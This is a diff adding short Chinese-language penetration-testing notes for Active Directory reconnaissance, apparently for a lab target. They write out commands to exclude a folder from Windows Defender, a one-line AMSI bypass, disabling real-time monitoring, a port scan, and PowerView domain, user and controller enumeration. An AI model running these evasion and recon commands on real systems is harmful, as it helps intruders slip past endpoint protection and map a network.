@@ -1,1 +1,30 @@
+把某一個資料夾set成"defender不自動刪除地帶"
+	Add-MpPreference -ExclusionPath "C:\Tools"
+下載PowerView:
+	https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+在本窗口繞過惡意指令, 包括PowerView:
+	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+	另一個辦法是disable掉整個Windows Defender
+		Set-MpPreference -DisableRealtimeMonitoring $true
+Import PowerView:
+	Import-Module .\PowerView.ps1
 
+找DC: 
+	Get-NetDomainController
+
+掃port:
+		$ports = @(53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985)
+	foreach ($port in $ports) {
+		Test-NetConnection -ComputerName 10.10.10.161 -Port $port -WarningAction SilentlyContinue |
+		Select-Object RemotePort, TcpTestSucceeded
+	}
+
+找LDAP地圖: 
+	# 找有多少個Domain, 並以LDAP形式表示出來
+	Get-NetDomain
+
+	# 找此Domain所有User, 並以LDAP形式表示出來
+	Get-NetUser
+
+	# 找此Domain有多少DC, 並以LDAP形式表示出來
+	Get-NetDomainController
